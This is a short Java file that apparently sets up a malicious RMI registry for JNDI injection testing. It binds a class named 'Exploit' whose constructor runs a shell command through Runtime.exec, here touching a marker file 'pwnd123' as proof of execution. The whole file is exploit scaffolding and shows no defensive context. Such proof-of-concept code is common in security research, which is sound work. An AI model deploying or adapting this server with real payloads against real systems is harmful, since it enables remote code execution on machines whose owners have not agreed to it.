package rmi;

import java.io.IOException;
import java.rmi.AlreadyBoundException;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.UnicastRemoteObject;

class Exploit implements Remote {
	public Exploit() throws IOException {
		Runtime.getRuntime().exec(new String[]{"bash", "-c", "touch /Users/logic/pwnd123"});
	}
}

public class JNDIServer{
	
	public static void main(String[] args) throws AlreadyBoundException, IOException {
		// TODO Auto-generated method stub
		
		Exploit exploit = new Exploit();
		Remote r = UnicastRemoteObject.exportObject(exploit, 19001);
		Registry registry = LocateRegistry.createRegistry(19000);
		registry.bind("Exploit", r);
		System.out.println("Server Done");
	}

}
